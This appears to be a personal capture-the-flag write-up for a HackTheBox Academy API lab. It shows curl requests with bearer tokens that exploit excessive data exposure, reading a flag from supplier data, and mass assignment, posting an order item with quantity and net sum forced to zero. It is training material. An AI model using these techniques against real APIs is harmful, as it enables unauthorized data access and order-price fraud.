# [Broken Object Property Level Authorization](Broken%20Object%20Property%20Level%20Authorization.md)
### Exploit another Excessive Data Exposure vulnerability and submit the flag.

Get Roles

![](Screenshot%202026-09-15%20at%2013.55.02.png)

Obtain flag

```sh
curl -X 'GET' \
  'http://154.57.164.78:31329/api/v1/supplier-companies' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjVAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiLCJTdXBwbGllckNvbXBhbmllc19HZXQiLCJTdXBwbGllckNvbXBhbmllc19HZXRBbGwiXSwiZXhwIjoxNzg5NDU2NDc3LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.TVdgwr5AaEXXVWytWsIc34w3jVgIKIN4Ep0oYYeVvTlmAfCGEiWBhdZ8rB0GdMwzIfC58uH-kUcfox7M_wTxnQ'
```

```http
{
      "id": "ccb287ef-83a6-423b-942a-089f87fa144c",
      "name": "HTB Academy",
      "email": "HTB{d759c70b5a9f6a392af78cc1eca9cdf0}",
      "isExemptedFromMarketplaceFee": 0,
      "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
    }
```
### Exploit another Mass Assignment vulnerability and submit the flag.

![](Screenshot%202026-09-15%20at%2014.02.25.png)

Added order successfully

```sh
curl -X 'POST' \
  'http://154.57.164.78:31329/api/v1/customers/orders/items' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTc4OTQ1NzIyMSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.Ykv7b8h1NSDTyfXnGbat_BURzfklvaCXFPktzfuCwKWjCZnTXuFJwngP-0kyesQMqHHLpuBlXYgl8nrOa-1j-g' \
  -H 'Content-Type: application/json' \
  -d '{
  "OrderID": "87b0a5bb-1121-47a7-a201-f30a8626fa33",
  "OrderItems": [
    {
      "ProductID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",
      "Quantity": 0,
      "NetSum": 0
    }
  ]
}'
{"SuccessStatus":true,"Message":"All items have been added successfully"}
```

```sh
curl -s -X GET 'http://154.57.164.78:31329/api/v1/products/a923b706-0aaa-49b2-ad8d-21c97ff6fac7' \
-H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTc4OTQ1NzIyMSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.Ykv7b8h1NSDTyfXnGbat_BURzfklvaCXFPktzfuCwKWjCZnTXuFJwngP-0kyesQMqHHLpuBlXYgl8nrOa-1j-g'
```
![](Screenshot%202026-09-15%20at%2014.18.00.png)

Don't forget the Quantity and Netsum

![](Screenshot%202026-09-15%20at%2014.27.32.png)